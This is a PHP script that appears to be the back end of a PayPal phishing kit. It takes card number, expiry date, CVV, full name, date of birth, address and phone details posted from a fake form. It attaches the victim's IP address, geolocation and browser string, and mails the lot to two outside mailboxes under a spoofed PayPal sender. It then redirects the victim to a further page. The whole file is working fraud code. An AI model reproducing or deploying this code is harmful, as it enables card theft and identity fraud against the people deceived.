<?php

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$date =	date("D M d, Y g:i a");
$user_agent  = $_SERVER['HTTP_USER_AGENT'];
$user_ip = getenv('REMOTE_ADDR');
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");

$ip = getenv("REMOTE_ADDR");

$message = "---------------Paypal Results------------------\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Submitted By : ".$user_ip."\n";
$message .= "Country Name : {$geoplugin->countryName}"."\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date And Time : ".$adddate."\n";
$message .= "Browser Details : ".$user_agent."\n";
$message .= "Card Type : ".$_POST['cardtype']."\n";
$message .= "Card Number: ".$_POST['cardnumber']."\n";
$message .= "Expiry Date: ".$_POST['expdate']."\n";
$message .= "CVV: ".$_POST['cvv']."\n";
$message .= "Full Name: ".$_POST['fullname']."\n";
$message .= "Date of Birth: ".$_POST['dob']."\n";
$message .= "Address : ".$_POST['address']."\n";
$message .= "City : ".$_POST['city']."\n";
$message .= "Zip Code : ".$_POST['zipcode']."\n";
$message .= "State: ".$_POST['state']."\n";
$message .= "Country: ".$_POST['country']."\n";
$message .= "State: ".$_POST['state']."\n";
$message .= "Phone Type : ".$_POST['phonetype']."\n";
$message .= "Phone Code : ".$_POST['phonecode']."\n";
$message .= "Phone Number : ".$_POST['phonenumber']."\n";
$message .= "--------xXx--------\n";
$message .= "IP Address: $ip \n";

$recipient = "partymadfunleed223@protonmail.com,bringfishmoney82@tutanota.com";
$subject = "Paypal ReZulT | $ip";
$headers = "From: Paypal <info@yahoomail.com>\n";
$headers .= "MIME-Version: 1.0\n";
//$headers .= "Content-Type: text/plain; charset=UTF-8\n";
//$headers .= "Content-Transfer-Encoding: 8bit\n";

if(mail($recipient, $subject, $message,$headers)){ 
   


}else{
	
	echo "error sending email";
	}
	
	/* if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest')
    {
        header("content-type: application/json");
        //echo json_encode('success' => true);
		//header('Location: 1nd8x.aspx?&c='.generateRandomString(200));
        exit;

    }else{
        //header("Location: https://products.office.com/en-au/business/teamwork/business-voice?rand=WebAppSecurity.1&e=$email");
    }*/

//mail($recipient, $subj, $msg,"$headers");
header("Location: pmc1.php?".generateRandomString(80));

?>
